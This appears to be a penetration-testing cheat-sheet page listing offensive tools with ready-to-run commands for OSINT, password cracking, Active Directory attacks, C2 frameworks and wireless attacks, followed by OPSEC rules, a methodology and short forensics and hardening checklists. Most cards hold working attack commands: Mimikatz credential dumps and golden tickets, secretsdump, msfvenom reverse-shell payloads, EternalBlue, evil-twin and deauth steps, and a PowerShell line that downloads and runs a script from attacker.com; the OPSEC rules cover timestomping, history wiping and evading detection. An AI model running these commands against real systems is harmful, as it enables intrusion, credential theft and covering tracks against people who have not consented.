SpiderFootOSINT
Automated OSINT. 200+ modules scraping 100+ sources. Runs autonomously on a domain/IP/email/name and builds a full intel map.
pip install spiderfoot python3 -m spiderfoot -l 127.0.0.1:5001 # Open browser → New Scan → target → select modules → GO # Key modules: DNS, Shodan, HaveIBeenPwned, LinkedIn, GitHub
SherlockOSINT
Username enumeration across 300+ platforms. Find all accounts owned by a target handle in seconds.
pip install sherlock-project sherlock johndoe sherlock johndoe --timeout 5 --output results.txt # Also try: whatsmyname.app (web) / socialscan (email/username)
EXIF & Geo ToolsOSINT
Extract metadata from photos — GPS coords, camera model, creation time. Geolocate images by landmarks, shadows, or satellite comparison.
exiftool photo.jpg | grep -i "gps\|location\|date" # Web: exifdata.com, metapicz.com # Geolocation: SunCalc.org (shadow analysis), Yandex Maps, Google Earth # EXIF strip: exiftool -all= photo.jpg
HashcatCRACK
World's fastest GPU-based password cracker. Supports 300+ hash types. Dictionary, mask, rule, combinator, and hybrid attacks. rockyou.txt has 14M passwords.
hashcat -m 1000 hashes.txt rockyou.txt # NTLM hashcat -m 1800 hashes.txt rockyou.txt # sha512crypt hashcat -m 22000 hashes.txt rockyou.txt # WPA2 hashcat -m 1000 hashes.txt rockyou.txt -r best64.rule hashcat --show hashes.txt # show cracked
John the RipperCRACK
CPU-based cracker. Great for Unix shadow files, ZIP/RAR/PDF passwords, SSH keys. Jumbo edition supports more formats.
john --wordlist=rockyou.txt hashes.txt john --format=bcrypt hashes.txt zip2john secret.zip > zip.hash && john zip.hash ssh2john id_rsa > ssh.hash && john ssh.hash --wordlist=rockyou.txt john --show hashes.txt
CeWL + Custom WordlistsCRACK
CeWL scrapes a target website and generates a custom wordlist from its content — employees will often use company/product name variants as passwords.
cewl https://target.com -d 3 -m 6 -w wordlist.txt # Mutate with hashcat rules: hashcat hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule # Common mutations: Password1! P@ssw0rd Company2024!
BloodHoundACTIVE DIR
Maps Active Directory attack paths visually. Finds the shortest path from your compromised account to Domain Admin. Uses graph theory on AD relationships.
# Step 1: collect data (run as domain user) .\SharpHound.exe -c All --zipfilename blood.zip # Step 2: import into BloodHound GUI # Step 3: query "Shortest Path to Domain Admin" # Key queries: Kerberoastable accounts, ASREPRoastable, DCSync rights
ImpacketACTIVE DIR
Python library for Windows network protocols. PSExec, WMIExec, DCSync, hash dumping, SMB relay — the backbone of Windows lateral movement.
python3 psexec.py domain/user:pass@target.com python3 wmiexec.py domain/user:pass@target.com python3 secretsdump.py domain/user:pass@dc.domain.com # dump all hashes python3 GetUserSPNs.py domain/user:pass -dc-ip 10.0.0.1 -request # Kerberoast python3 GetNPUsers.py domain/ -usersfile users.txt -no-pass # ASREPRoast
MimikatzCRED DUMP
Extracts plaintext passwords, hashes, PIN codes, and Kerberos tickets from Windows memory (LSASS). The single most used post-exploitation tool in history.
privilege::debug sekurlsa::logonpasswords # dump from LSASS sekurlsa::pth /user:admin /domain:corp /ntlm:HASH /run:cmd.exe lsadump::dcsync /domain:corp.local /user:Administrator kerberos::list /export # export Kerberos tickets kerberos::golden /user:admin /domain:corp /sid:S-1-5... /krbtgt:HASH
NmapNETWORKRECON
Network mapper. Port scanning, service detection, OS fingerprinting, NSE script automation. Every pentest starts here.
nmap -sV -sC -O -p- --min-rate 5000 10.0.0.1 nmap -sU -p 161,623,53 10.0.0.1 nmap --script vuln 10.0.0.1 nmap -sn 192.168.1.0/24 nmap -oA scan_results 10.0.0.1
AmassRECONOSINT
Attack surface mapping. Passive and active subdomain enumeration using 50+ sources. Best-in-class for external recon.
amass enum -passive -d target.com -o subs.txt amass enum -active -brute -d target.com amass intel -org "Target Corp"
ShodanRECONOSINT
Search engine for internet-connected devices. Find exposed servers, cameras, industrial systems without touching the target.
shodan search "org:Target" port:22 shodan host 1.2.3.4 # Dorks: ssl:"target.com" http.favicon.hash:123456 # "default password" port:23 city:"London"
theHarvesterOSINT
Gathers emails, names, subdomains, IPs from public sources. Essential for social engineering prep.
theHarvester -d target.com -b all -l 500 theHarvester -d target.com -b linkedin,shodan,github
Burp SuiteWEB
Industry-standard web app testing platform. Intercept, modify, replay HTTP. Proxy + Repeater + Intruder + Scanner. Indispensable for bug bounty.
# Key features: # Proxy -- intercept browser traffic # Repeater -- modify and replay requests # Intruder -- automated fuzzing / brute force # Scanner -- automated vuln detection (Pro) # Collaborator -- OOB interaction detection
SQLMapWEBEXPLOIT
Automated SQL injection detection and exploitation. All major DBs. Can dump data, get OS shell, bypass WAFs.
sqlmap -u "http://target.com/?id=1" --dbs sqlmap -u "http://target.com/" --data="id=1" --level=5 --risk=3 sqlmap -u "http://target.com/?id=1" --os-shell sqlmap -u "http://target.com/?id=1" --tamper=space2comment
ffufWEBRECON
Fast web fuzzer (Go). Content discovery, subdomain brute-force, parameter fuzzing, virtual host discovery. Replaces dirb/dirbuster.
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/big.txt ffuf -u http://FUZZ.target.com/ -w subdomains.txt ffuf -u http://target.com/?FUZZ=value -w params.txt
MetasploitEXPLOITC2
World's most-used pentest framework. 2,000+ exploits, payloads, auxiliary modules. msfvenom for payload generation.
msfconsole use exploit/windows/smb/ms17_010_eternalblue set RHOSTS 10.0.0.1 set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST 10.0.0.2 && run msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.2 LPORT=4444 -f exe > shell.exe
searchsploitEXPLOIT
Offline CLI to Exploit-DB. Find CVE exploits by software name and version without internet access.
searchsploit apache 2.4.49 searchsploit -m 50383 searchsploit --cve CVE-2021-41773
MimikatzPOST-EXPASSWORD
Windows credential extraction. Dump plaintext passwords, NTLM hashes, Kerberos tickets from memory. The skeleton key for Windows environments.
privilege::debug sekurlsa::logonpasswords lsadump::sam lsadump::dcsync /user:krbtgt kerberos::golden /user:admin /domain:corp.local /sid:S-1-5... /krbtgt:HASH
BloodHoundPOST-EXRECON
Active Directory attack path mapping. Visualises paths to Domain Admin. Reveals exploitable stepping stones in AD environments.
SharpHound.exe --collectionmethods all --zipfilename loot.zip bloodhound-python -u user -p pass -d corp.local -c all # Import .zip into BloodHound GUI # Query: "Find Shortest Paths to Domain Admin"
LinPEAS / WinPEASPOST-EX
Privilege escalation scripts. Auto-enumerate SUID binaries, writable paths, cron jobs, unquoted service paths, CVEs.
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh # Windows PowerShell: iex(new-object net.webclient).downloadstring("http://attacker.com/winpeas.ps1")
Cobalt StrikeC2
Commercial adversary simulation platform. Beacon implant, malleable C2 profiles, OPSEC-friendly TTPs. Used by red teams AND real APT groups.
# Beacon: DNS, HTTP, HTTPS, SMB, TCP channels # Features: sleep jitter, process injection, # malleable profiles, BOF (Beacon Object Files) # Detection: CS-Detector, 1768.py (config parser)
SliverC2
Open-source C2 by Bishop Fox. Cross-platform Go implants, mTLS/WireGuard/HTTP/DNS channels. Free Cobalt Strike alternative.
sliver-server generate --mtls 10.0.0.2 --os windows --arch amd64 --save shell.exe mtls --lport 4444 sessions
HavocC2
Modern open-source C2. Demon agent (C), sleep obfuscation, indirect syscalls, stack spoofing, AMSI/ETW bypass built-in.
./havoc server --profile ./profiles/havoc.yaotl # Demon agent: stack spoofing, indirect syscalls # AMSI/ETW bypass, process injection built-in
OPERATIONAL SECURITY // THE 20 RULES
01Never test from your home IP. Use VPN + Tor, VPS, or dedicated attack box. Your ISP logs everything.
02Separate identity for every op. Different email, username, browser profile, VM. Cross-contamination kills careers.
03Never reuse tools across targets. Unique staging servers, payloads, C2 infrastructure per engagement.
04Assume you are being logged. Every packet, command, login. Behave accordingly at all times.
05Exfil over encrypted channels only. DNS-over-HTTPS, HTTPS with valid cert, never plaintext.
06Timestomp all dropped files. Match timestamps to legitimate system files to avoid forensic detection.
07Use living-off-the-land techniques. LOLBins leave minimal artefacts vs. dropping custom tools.
08Clear bash/PowerShell history. history -c on exit. Set HISTSIZE=0 before sensitive commands.
09Rotate C2 domains and IPs weekly. Categorise domains as benign content. Use domain fronting where possible.
10Never scan from your C2 server. Separate recon, exploitation, and C2 infrastructure entirely.
11Match User-Agent to the target environment. Rogue browser strings in proxy logs are an IOC.
12Respect business hours. Beacons firing at 3am in a 9-5 org trigger anomaly alerts in SIEM.
13Never store plaintext credentials. Hash or vault them. Rotate after every engagement.
14Use jitter in beacon sleep. Fixed-interval callbacks are a trivial SIEM detection signature.
15Validate scope before every action. Out-of-scope is career-ending and potentially criminal.
16Document everything. Screenshots, timestamps, commands. Protects you and proves your findings.
17Don't be greedy. One shell proves the point. Lateral movement for fun creates a trail.
18Certificate transparency logs are public. Your C2 cert will be indexed. Use wildcard certs via Let's Encrypt API.
19Wipe attack infrastructure after engagement. Lingering VPS with C2 is criminal liability.
20Get it in writing. Rules of Engagement, scope, Statement of Work. No written auth = no legal protection.
PENTEST METHODOLOGY // PTES + MITRE ATT&CK
PHASE 1 // RECONNAISSANCE
Passive: OSINT, Shodan, Google dorks, LinkedIn, crt.sh, theHarvester
Active: port scan, service enum, DNS brute-force, tech fingerprint

PHASE 2 // SCANNING & ENUMERATION
Nmap -sV -sC -A | Nikto | Gobuster | SMB: enum4linux | SNMP: onesixtyone
Web: wappalyzer, robots.txt, sitemap, JS analysis, API endpoint discovery

PHASE 3 // EXPLOITATION
Match version to CVE (searchsploit, NVD) | Metasploit | Manual exploits
Web: SQLi, XSS, SSRF, LFI, IDOR, auth bypass | Phishing | Password spray

PHASE 4 // POST-EXPLOITATION
Stabilise shell (TTY upgrade) | id, uname, sudo -l, crontab, /etc/passwd
Privesc: LinPEAS, SUID, writable paths, kernel CVEs, sudo misconfig

PHASE 5 // LATERAL MOVEMENT
Credential reuse | Pass-the-Hash | Kerberoasting | BloodHound AD paths
Pivoting: SSH tunnels, chisel, ligolo-ng, sshuttle

PHASE 6 // REPORTING
Data exfil proof | Screenshot Domain Admin | Clean up | Full technical report
Remediation recommendations | Re-test verification | Risk ratings (CVSS)
Aircrack-ngWIRELESS
Complete 802.11 WEP/WPA/WPA2 cracking suite. Capture 4-way handshakes, crack with wordlists. The original wireless attack toolkit.
airmon-ng start wlan0 # enable monitor mode airodump-ng wlan0mon # scan for networks airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon # target AP aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon # deauth client aircrack-ng -w rockyou.txt capture-01.cap # crack handshake
Hashcat WPA2WIRELESSPASSWORD
GPU-accelerated WPA2 cracking. Convert .cap to .hc22000 format and crack with GPU for massive speedups over CPU-based aircrack-ng.
hcxdumptool -i wlan0mon -o capture.pcapng --active_beacon # capture hcxpcapngtool -o hash.hc22000 capture.pcapng # convert hashcat -m 22000 hash.hc22000 rockyou.txt # crack hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d # 8-digit mask
Evil Twin / Rogue APWIRELESS
Create a fake access point mimicking a real network. Clients auto-connect, traffic flows through attacker. Capture credentials from unencrypted connections.
# hostapd-wpe for evil twin with WPA2-Enterprise credential capture # Or use airbase-ng for open network: airbase-ng -e "Free_WiFi" -c 6 wlan0mon # create AP # Route traffic through attacker: echo 1 > /proc/sys/net/ipv4/ip_forward iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE # Then run mitmproxy or SSLstrip on the bridge interface
WPS AttacksWIRELESS
WPS PIN brute-force (Reaver) and Pixie Dust attack. Many routers still have WPS enabled with vulnerable implementations.
wash -i wlan0mon # find WPS-enabled APs reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv # brute force PIN reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 # Pixie Dust attack # Pixie Dust works on routers with weak random number generation
bettercapWIRELESSNETWORK
Swiss army knife for network attacks. ARP spoofing, DNS spoofing, HTTP/S MITM, WiFi deauth, BLE scanning, and more.
bettercap -iface wlan0 # In bettercap console: wifi.recon on wifi.deauth AA:BB:CC:DD:EE:FF # deauth specific client net.probe on # discover hosts arp.spoof.targets 192.168.1.5 arp.spoof on net.sniff on
DIGITAL FORENSICS & INCIDENT RESPONSE
TRIAGE (LINUX)
who; w; last -20 # active users ps auxf # process tree ss -tulnp # open connections find / -mtime -1 -type f 2>/dev/null # files changed 24h find / -perm -4000 -type f 2>/dev/null # SUID binaries cat /var/log/auth.log | grep Failed # failed logins
MEMORY FORENSICS (Volatility)
vol.py -f memory.raw imageinfo vol.py -f memory.raw --profile=Win10x64 pslist vol.py -f memory.raw --profile=Win10x64 netscan vol.py -f memory.raw --profile=Win10x64 malfind
IOC HUNTING CHECKLIST
Unusual parent processes | masquerading (svchost in wrong dir)
Network connections to unknown IPs | New admin accounts
Cleared event logs | Base64 in registry | Disabled security tools
HARDENING CHECKLIST
LINUX SERVER
[ ]Disable root SSH: PermitRootLogin no in sshd_config
[ ]Keys only: PasswordAuthentication no
[ ]Firewall: ufw/iptables — allow only needed ports
[ ]Auto security updates + fail2ban + auditd
WEB APPLICATION
[ ]Parameterised queries everywhere. Never string-concat SQL
[ ]Security headers: CSP, HSTS, X-Frame-Options, X-Content-Type-Options
[ ]HTTPS + HSTS preload + TLS 1.2+ only, disable TLS 1.0/1.1
[ ]Dependency scanning: npm audit, pip-audit, Dependabot, Snyk
[ ]Secrets in env vars only. Rotate API keys. Use secrets manager
● KGB // COUNTER-INTELLIGENCE MONITOR
INTERCEPTS: 0
SCANNING FOR THREAT VECTORS...
WEB
BINARY
NETWORK
AI/ML
CRYPTO
OSINT
